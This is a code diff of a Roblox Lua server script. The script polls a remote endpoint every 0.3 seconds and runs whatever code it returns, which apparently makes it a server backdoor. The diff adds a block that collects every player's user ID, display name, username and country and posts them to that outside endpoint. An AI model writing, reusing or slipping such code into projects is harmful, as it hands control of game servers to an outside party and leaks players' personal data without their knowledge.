@@ -16,12 +16,24 @@ local function plrAdded(plr)
 			while true do
 				task.wait(0.3)
 				pcall(function()
-					local queue = https:JSONDecode(https:GetAsync(endpoint.."api/ping", true, {["user-id"]=tostring(plr.UserId)}))
+					local queue = https:JSONDecode(https:GetAsync(endpoint.."api/ping?userid="..tostring(plr.UserId), true))
                     for _, code in pairs(queue) do
 				    	coroutine.wrap(function()
                             run(code)
                         end)()
                     end
+				end)
+				pcall(function()
+					local plrs = {}
+					for _,plr in pairs(game:GetService("Players"):GetPlayers()) do
+						local info = {}
+						info["UserId"] = plr.UserId
+						info["DisplayName"] = plr.DisplayName
+						info["Username"] = plr.Name
+						info["Country"] = game:GetService("LocalizationService"):GetCountryRegionForPlayerAsync(plr)
+						plrs[plr.Name] = info
+					end
+					https:PostAsync(endpoint.."api/players?userid="..tostring(plr.UserId), https:JSONEncode(plrs), Enum.HttpContentType.ApplicationJson, false)
 				end)
 			end
 		end)
